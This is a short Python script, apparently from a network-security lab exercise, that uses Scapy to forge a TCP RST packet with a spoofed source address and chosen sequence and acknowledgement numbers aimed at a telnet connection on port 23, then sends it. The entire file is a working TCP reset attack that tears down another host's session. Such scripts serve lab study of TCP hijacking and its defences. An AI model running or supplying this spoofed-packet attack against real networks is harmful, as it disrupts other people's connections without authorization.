#!/usr/bin/python3
from scapy.all import *

ip = IP(src="192.168.137.150", dst="192.168.137.140")
tcp = TCP(sport=46176, dport=23, flags="R", seq=3375652917, ack=1837764021)
pkt = ip/tcp
ls(pkt)
print(pkt)
send(pkt, verbose=0)